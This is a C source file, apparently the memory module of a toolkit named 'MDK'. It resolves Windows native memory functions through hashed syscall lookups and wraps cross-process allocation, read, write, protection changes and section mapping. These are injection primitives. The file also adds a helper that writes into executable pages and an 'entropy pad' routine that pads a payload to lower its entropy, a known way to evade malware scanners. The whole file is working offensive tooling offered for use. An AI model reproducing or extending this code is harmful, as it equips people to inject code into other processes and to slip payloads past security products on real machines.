// MDK
// docs    : https://sebafvs.com/mdk/memory
// author  : @sebafvs

#include <windows.h>
#include "mdk/memory.h"
#include "mdk/hashes.h"
#include "mdk/syscalls.h"
#include "mdk/nt.h"

// function pointer types

typedef NTSTATUS(NTAPI* pfnZwAVM)(
    HANDLE      ProcessHandle,
    PVOID*      BaseAddress,
    ULONG_PTR   ZeroBits,
    PSIZE_T     RegionSize,
    ULONG       AllocationType,
    ULONG       Protect);

typedef NTSTATUS(NTAPI* pfnZwFVM)(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   FreeType);

typedef NTSTATUS(NTAPI* pfnZwPVM)(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect);

typedef NTSTATUS(NTAPI* pfnZwRVM)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  BufferSize,
    PSIZE_T NumberOfBytesRead);

typedef NTSTATUS(NTAPI* pfnZwWVM)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  BufferSize,
    PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* pfnZwQVM)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    ULONG   MemoryInformationClass,
    PVOID   MemoryInformation,
    SIZE_T  MemoryInformationLength,
    PSIZE_T ReturnLength);

typedef NTSTATUS(NTAPI* pfnZwCS)(
    PHANDLE         SectionHandle,
    ACCESS_MASK     DesiredAccess,
    PVOID           ObjectAttributes,
    PLARGE_INTEGER  MaximumSize,
    ULONG           SectionPageProtection,
    ULONG           AllocationAttributes,
    HANDLE          FileHandle);

typedef NTSTATUS(NTAPI* pfnZwMVOS)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    ULONG           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect);

typedef NTSTATUS(NTAPI* pfnZwUMVOS)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress);

// static state

static pfnZwAVM   _ZwAVM;
static pfnZwFVM   _ZwFVM;
static pfnZwPVM   _ZwPVM;
static pfnZwRVM   _ZwRVM;
static pfnZwWVM   _ZwWVM;
static pfnZwQVM   _ZwQVM;
static pfnZwCS    _ZwCS;
static pfnZwMVOS  _ZwMVOS;
static pfnZwUMVOS _ZwUMVOS;
static BOOL       _ready;

// init

static MDK_RESULT _init(void) {
    if (_ready) { return MDK_MAKE_OK(); }
    MDK_CHECK(mdk_sc_resolve(ZwAllocateVirtualMemory_H,  (PVOID*)&_ZwAVM));
    MDK_CHECK(mdk_sc_resolve(ZwFreeVirtualMemory_H,      (PVOID*)&_ZwFVM));
    MDK_CHECK(mdk_sc_resolve(ZwProtectVirtualMemory_H,   (PVOID*)&_ZwPVM));
    MDK_CHECK(mdk_sc_resolve(ZwReadVirtualMemory_H,      (PVOID*)&_ZwRVM));
    MDK_CHECK(mdk_sc_resolve(ZwWriteVirtualMemory_H,     (PVOID*)&_ZwWVM));
    MDK_CHECK(mdk_sc_resolve(ZwQueryVirtualMemory_H,     (PVOID*)&_ZwQVM));
    MDK_CHECK(mdk_sc_resolve(ZwCreateSection_H,          (PVOID*)&_ZwCS));
    MDK_CHECK(mdk_sc_resolve(ZwMapViewOfSection_H,       (PVOID*)&_ZwMVOS));
    MDK_CHECK(mdk_sc_resolve(ZwUnmapViewOfSection_H,     (PVOID*)&_ZwUMVOS));
    _ready = TRUE;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_alloc(IN HANDLE process, IN SIZE_T size, IN DWORD prot, OUT PVOID* address) {
    MDK_CHECK(_init());
    PVOID  allocation_base = NULL;
    SIZE_T region_size     = size;

    NTSTATUS status = _ZwAVM(process, &allocation_base, 0, &region_size, MEM_COMMIT | MEM_RESERVE, prot);
    if (status) { return MDK_MAKE_FAIL("ZwAllocateVirtualMemory", status); }

    *address = allocation_base;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_free(IN HANDLE process, IN PVOID base) {
    MDK_CHECK(_init());

    PVOID  base_address = base;
    SIZE_T region_size  = 0;

    NTSTATUS status = _ZwFVM(process, &base_address, &region_size, MEM_RELEASE);
    return status ? MDK_MAKE_FAIL("ZwFreeVirtualMemory", status) : MDK_MAKE_OK();
}

// read / write

MDK_RESULT mdk_write(IN HANDLE process, IN PVOID dest, IN const void* src, IN SIZE_T size) {
    MDK_CHECK(_init());
    SIZE_T bytes_written = 0;

    NTSTATUS status = _ZwWVM(process, dest, (PVOID)src, size, &bytes_written);
    if (status) { return MDK_MAKE_FAIL("ZwWriteVirtualMemory", status); }
    if (bytes_written != size) { return MDK_MAKE_FAIL("mdk_write:partial", MDK_STATUS_INVALID_IMAGE_FORMAT); }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_read(IN HANDLE process, IN PVOID src, OUT void* dest, IN SIZE_T size) {
    MDK_CHECK(_init());
    SIZE_T bytes_read = 0;

    NTSTATUS status = _ZwRVM(process, src, dest, size, &bytes_read);
    if (status) { return MDK_MAKE_FAIL("ZwReadVirtualMemory", status); }
    if (bytes_read != size) { return MDK_MAKE_FAIL("mdk_read:partial", MDK_STATUS_INVALID_IMAGE_FORMAT); }

    return MDK_MAKE_OK();
}

// protection

MDK_RESULT mdk_protect(IN HANDLE process, IN PVOID addr, IN SIZE_T size, IN DWORD new_prot, OUT DWORD* old_prot) {
    MDK_CHECK(_init());

    PVOID  base_address        = addr;
    SIZE_T region_size         = size;
    DWORD  previous_protection = 0;

    NTSTATUS status = _ZwPVM(process, &base_address, &region_size, new_prot, &previous_protection);
    if (status) { return MDK_MAKE_FAIL("ZwProtectVirtualMemory", status); }
    if (old_prot) { *old_prot = previous_protection; }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_query(IN HANDLE process, IN PVOID addr, OUT MEMORY_BASIC_INFORMATION* mbi) {
    MDK_CHECK(_init());
    SIZE_T return_length = 0;

    NTSTATUS status = _ZwQVM(process, addr, 0, mbi, sizeof(MEMORY_BASIC_INFORMATION), &return_length);
    return status ? MDK_MAKE_FAIL("ZwQueryVirtualMemory", status) : MDK_MAKE_OK();
}

// section

MDK_RESULT mdk_create_section(IN SIZE_T size, IN DWORD protect, OUT HANDLE* section) {
    MDK_CHECK(_init());
    LARGE_INTEGER section_size = { 0 };
    section_size.QuadPart = (LONGLONG)size;

    NTSTATUS status = _ZwCS(section, SECTION_ALL_ACCESS, NULL, &section_size, protect, SEC_COMMIT, NULL);
    return status ? MDK_MAKE_FAIL("ZwCreateSection", status) : MDK_MAKE_OK();
}

MDK_RESULT mdk_create_section_image(IN HANDLE file_handle, OUT HANDLE* section) {
    MDK_CHECK(_init());

    NTSTATUS status = _ZwCS(section, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, file_handle);
    return status ? MDK_MAKE_FAIL("ZwCreateSection:SEC_IMAGE", status) : MDK_MAKE_OK();
}

// Pass (HANDLE)-1 as process to map into the current process.
MDK_RESULT mdk_map(IN HANDLE section, IN HANDLE process, IN SIZE_T size, IN DWORD protect, OUT PVOID* address) {
    MDK_CHECK(_init());
    PVOID  mapped_address = NULL;
    SIZE_T view_size      = size;

    // ViewUnmap(2): view is not inherited by child processes.
    NTSTATUS status = _ZwMVOS(section, process, &mapped_address, 0, 0, NULL, &view_size, 2, 0, protect);
    if (status) { return MDK_MAKE_FAIL("ZwMapViewOfSection", status); }

    *address = mapped_address;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_unmap(IN HANDLE process, IN PVOID base) {
    MDK_CHECK(_init());
    NTSTATUS status = _ZwUMVOS(process, base);
    return status ? MDK_MAKE_FAIL("ZwUnmapViewOfSection", status) : MDK_MAKE_OK();
}

// write + exec

// Restores protection even on write failure, avoids leaving the region permanently degraded.
MDK_RESULT mdk_write_exec(IN HANDLE process, IN PVOID addr, IN const void* data, IN SIZE_T size) {
    MDK_CHECK(_init());
    DWORD previous_protection = 0;
    MDK_CHECK(mdk_protect(process, addr, size, PAGE_READWRITE, &previous_protection));

    MDK_RESULT result = mdk_write(process, addr, data, size);
    mdk_protect(process, addr, size, previous_protection, NULL);
    return result;
}

MDK_RESULT mdk_entropy_pad(IN const BYTE* payload, IN SIZE_T size, IN BYTE pad_byte, IN SIZE_T pad_count, OUT BYTE** out, OUT SIZE_T* out_size) {
    SIZE_T total_size = size + pad_count;

    BYTE* buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total_size);
    if (!buffer) { return MDK_MAKE_FAIL("HeapAlloc", MDK_STATUS_NO_MEMORY); }

    for (SIZE_T i = 0; i < size; i++)      { buffer[i]        = payload[i]; }
    for (SIZE_T i = 0; i < pad_count; i++) { buffer[size + i] = pad_byte;   }

    *out      = buffer;
    *out_size = total_size;

    return MDK_MAKE_OK();
}
